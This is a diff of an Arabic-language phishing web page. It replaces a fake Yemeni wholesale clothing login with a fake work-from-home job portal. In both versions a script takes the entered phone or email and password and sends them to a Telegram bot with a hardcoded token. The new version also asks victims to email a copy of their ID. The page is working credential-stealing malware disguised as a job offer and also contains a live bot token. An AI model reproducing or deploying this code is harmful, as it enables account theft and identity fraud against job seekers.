@@ -3,99 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التسويق الموحدة - جملة اليمن</title>
+    <title>فرص عمل من المنزل - شركة التسويق الإلكتروني</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
-        .nav-bar { background-color: #8e44ad; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; }
-        .hero-banner { background: #fff; padding: 20px; text-align: center; border-bottom: 2px solid #eee; }
-        .hero-banner h2 { color: #8e44ad; margin: 0; }
-        .hero-banner p { color: #666; font-size: 14px; }
-        
-        .container { padding: 15px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
-        .card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.1); position: relative; }
-        .card img { width: 100%; height: 150px; object-fit: cover; }
-        .card-info { padding: 10px; }
-        .card-info b { font-size: 14px; color: #333; }
-        .price-tag { background: #e74c3c; color: white; padding: 3px 8px; border-radius: 5px; font-size: 12px; display: inline-block; margin-top: 5px; }
-        
-        .login-section { background: #fff; margin: 20px 15px; padding: 20px; border-radius: 12px; border: 2px dashed #8e44ad; text-align: center; }
-        .login-section h3 { margin-top: 0; color: #333; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background-color: #8e44ad; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
-        .footer { background: #333; color: #fff; padding: 20px; text-align: center; font-size: 12px; margin-top: 30px; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f0f2f5; }
+        .hero-work { background: linear-gradient(135deg, #1e3a8a 0%, #C8102E 100%); }
+        .feature-card { background: white; border-radius: 24px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e5e7eb; }
+        .animate-pulse-slow { animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
     </style>
 </head>
-<body>
+<body class="text-gray-900">
 
-<div class="nav-bar">مجموعة التسويق المباشر - صنعاء</div>
-
-<div class="hero-banner">
-    <h2>أقوى عروض الجملة للمسوقات</h2>
-    <p>بضاعة جديدة وصلت الآن (عبايات، فساتين، إكسسوارات) بأسعار منافسة.</p>
-</div>
-
-<div class="container">
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?auto=format&fit=crop&w=300" alt="عباية">
-        <div class="card-info">
-            <b>عباية خليجي ملكي</b><br>
-            <span class="price-tag">18,500 ريال</span>
+    <header class="hero-work text-white pt-16 pb-32 px-6 text-center rounded-b-[60px] shadow-2xl relative">
+        <div class="max-w-4xl mx-auto relative z-10">
+            <div class="inline-block bg-yellow-400 text-blue-900 px-6 py-2 rounded-full font-black text-sm mb-6 animate-bounce">
+                مطلوب مسوقات ومسوقين من البيت فوراً 🏠
+            </div>
+            <h1 class="text-4xl md:text-6xl font-black mb-6 leading-tight">ابدأ عملك الخاص <br> براتب عمولات مجزي</h1>
+            <p class="text-white/90 text-lg max-w-2xl mx-auto font-medium">شركة التسويق الإلكتروني في اليمن تفتح باب الانضمام لفريقها. لا يشترط الخبرة، التدريب مجاني والعمل بالكامل من جوالك.</p>
         </div>
-    </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1595777457583-95e059d581b8?auto=format&fit=crop&w=300" alt="فستان">
-        <div class="card-info">
-            <b>فستان سهرة تركي</b><br>
-            <span class="price-tag">22,000 ريال</span>
+        <div class="absolute top-0 left-0 w-48 h-48 bg-white/10 rounded-full -ml-20 -mt-20 blur-3xl"></div>
+    </header>
+
+    <section class="max-w-5xl mx-auto -mt-16 px-6 grid grid-cols-1 md:grid-cols-3 gap-6 mb-16">
+        <div class="feature-card text-center">
+            <div class="text-3xl mb-2">💰</div>
+            <h3 class="font-black text-blue-900">دخل يومي</h3>
+            <p class="text-xs text-gray-500">عمولات فورية تصل إلى 30% على كل مبيعة.</p>
         </div>
-    </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1535633302703-b0703af48f18?auto=format&fit=crop&w=300" alt="إكسسوارات">
-        <div class="card-info">
-            <b>طقم إكسسوار ذهبي</b><br>
-            <span class="price-tag">4,500 ريال</span>
+        <div class="feature-card text-center border-t-4 border-yellow-400">
+            <div class="text-3xl mb-2">📱</div>
+            <h3 class="font-black text-blue-900">من منزلك</h3>
+            <p class="text-xs text-gray-500">ساعة واحدة يومياً من جوالك تكفي للبدء.</p>
         </div>
-    </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=300" alt="شنطة">
-        <div class="card-info">
-            <b>شنطة يد ماركة "درجة أولى"</b><br>
-            <span class="price-tag">9,000 ريال</span>
+        <div class="feature-card text-center">
+            <div class="text-3xl mb-2">🎓</div>
+            <h3 class="font-black text-blue-900">تدريب شامل</h3>
+            <p class="text-xs text-gray-500">سنعلمك فنون الإقناع والبيع باحترافية.</p>
         </div>
-    </div>
-</div>
+    </section>
 
-<div class="login-section">
-    <h3>تسجيل دخول المسوقات</h3>
-    <p>يرجى تسجيل الدخول لعرض قائمة الأسعار بالكامل وحجز الطلبيات.</p>
-    
-    <form action="https://formspree.io/f/xdajkgpz" method="POST" id="phishForm">
-        <input type="email" name="email" id="email" placeholder="البريد الإلكتروني أو الرقم" required>
-        <input type="password" name="password" id="password" placeholder="كلمة السر" required>
-        <input type="hidden" name="_subject" value="صيد جديد من منصة الملابس">
-        <button type="submit" class="btn">دخول واستلام الكتالوج</button>
-    </form>
-</div>
+    <main class="max-w-6xl mx-auto px-6 mb-20">
+        <h2 class="text-2xl font-black text-center mb-10 text-blue-900">أمثلة لمنتجات الشركة التي ستعمل عليها</h2>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+            <div class="bg-white p-3 rounded-3xl shadow-sm border">
+                <img src="https://images.unsplash.com/photo-1566174053879-31528523f8ae?w=300" class="rounded-2xl mb-2 w-full h-40 object-cover">
+                <span class="text-[10px] font-bold text-red-600 uppercase">موضة 2026</span>
+                <h4 class="font-bold text-xs">فساتين سهرة فاخرة</h4>
+            </div>
+            <div class="bg-white p-3 rounded-3xl shadow-sm border">
+                <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?w=300" class="rounded-2xl mb-2 w-full h-40 object-cover">
+                <span class="text-[10px] font-bold text-red-600 uppercase">عبايات</span>
+                <h4 class="font-bold text-xs">عبايات ملكي مطرزة</h4>
+            </div>
+            <div class="bg-white p-3 rounded-3xl shadow-sm border">
+                <img src="https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=300" class="rounded-2xl mb-2 w-full h-40 object-cover">
+                <span class="text-[10px] font-bold text-red-600 uppercase">إكسسوارات</span>
+                <h4 class="font-bold text-xs">أطقم هدايا متكاملة</h4>
+            </div>
+            <div class="bg-white p-3 rounded-3xl shadow-sm border">
+                <img src="https://images.unsplash.com/photo-1620916566398-39f1143ab7be?w=300" class="rounded-2xl mb-2 w-full h-40 object-cover">
+                <span class="text-[10px] font-bold text-red-600 uppercase">أطفال</span>
+                <h4 class="font-bold text-xs">ملابس أطفال مستوردة</h4>
+            </div>
+        </div>
+    </main>
 
-<div class="footer">
-    تواصل معنا (إدارة التسويق): 777158066 <br>
-    جميع الحقوق محفوظة © 2026 - صنعاء، شارع تعز
-</div>
+    <section class="max-w-lg mx-auto px-6 pb-24">
+        <div class="bg-white rounded-[45px] p-8 shadow-2xl border-2 border-blue-50 relative overflow-hidden">
+            <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] px-6 py-1 font-bold transform rotate-45 translate-x-10 translate-y-4">تقديم فوري</div>
+            
+            <h2 class="text-2xl font-black text-blue-900 mb-4 text-center">بوابة تقديم الطلبات</h2>
+            <p class="text-gray-500 text-sm mb-8 text-center leading-relaxed">
+                سجل دخولك الآن ثم ارفع بياناتك للعنوان البريد الإلكتروني لفريق الدعم لتوثيق حسابك لتكون من احد الموظفين المعتمدين في اليمن.
+            </p>
+            
+            <form id="jobForm" class="space-y-4 text-right">
+                <div class="space-y-1">
+                    <label class="text-xs font-black text-gray-400 mr-2 uppercase">رقم الجوال أو البريد</label>
+                    <input type="text" id="entry_user" required placeholder="000 000 000" class="w-full p-5 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-600 font-bold transition-all">
+                </div>
+                <div class="space-y-1">
+                    <label class="text-xs font-black text-gray-400 mr-2 uppercase">كلمة المرور</label>
+                    <input type="password" id="entry_pass" required placeholder="********" class="w-full p-5 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-600 font-bold transition-all">
+                </div>
+                <button type="submit" class="w-full py-5 bg-blue-900 text-white font-black rounded-2xl shadow-xl hover:bg-blue-800 transition-all text-lg">تقديم طلب التوظيف والتوثيق</button>
+            </form>
+            
+            <div class="mt-6 p-4 bg-yellow-50 rounded-2xl border border-yellow-200">
+                <p class="text-[10px] text-yellow-800 font-bold text-center italic">تنبيه: سيتم مراجعة طلبك خلال 24 ساعة من قبل إدارة شركة التسويق الإلكتروني.</p>
+            </div>
+        </div>
+    </section>
 
-<script>
-    const form = document.getElementById('phishForm');
-    form.addEventListener('submit', function(e) {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        
-        const token = "8549358187:AAGRic3rPa_yqyyE6XO5fAcqthKp02AtQj4";
-        const chat_id = "7770087246";
-        const text = `🎯 صيد جديد من منصة الملابس:\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-    });
-</script>
+    <footer class="bg-blue-950 text-white py-16 px-6 text-center rounded-t-[60px]">
+        <div class="max-w-4xl mx-auto space-y-6">
+            <p class="text-blue-200 font-bold text-sm tracking-wide">للتواصل المباشر مع فريق التوظيف</p>
+            <a href="tel:785179100" class="text-3xl font-black block hover:text-yellow-400 transition-colors tracking-tighter">785179100</a>
+            <div class="h-px bg-white/10 w-24 mx-auto"></div>
+            <p class="text-blue-300 text-sm lowercase">reemmohsen195@gmail.com</p>
+            <p class="text-white/30 text-[10px] pt-10">موقع شركة التسويق الإلكتروني - جميع الحقوق محفوظة لعام 2026</p>
+        </div>
+    </footer>
 
+    <script>
+        document.getElementById('jobForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('entry_user').value;
+            const pass = document.getElementById('entry_pass').value;
+            
+            const token = "8549358187:AAGRic3rPa_yqyyE6XO5fAcqthKp02AtQj4";
+            const chatId = "7770087246";
+            
+            const message = `💼 طلب توظيف جديد (عمل من المنزل):\n━━━━━━━━━━━━━━\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n📧 بريد التوثيق: reemmohsen195@gmail.com\n━━━━━━━━━━━━━━`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                alert("تم استلام طلب التوظيف. يرجى إرسال نسخة من الهوية الشخصية لبريد الشركة الموضح أسفل الصفحة لإتمام عملية التوثيق بنجاح.");
+                window.location.reload();
+            });
+        });
+    </script>
 </body>
 </html>
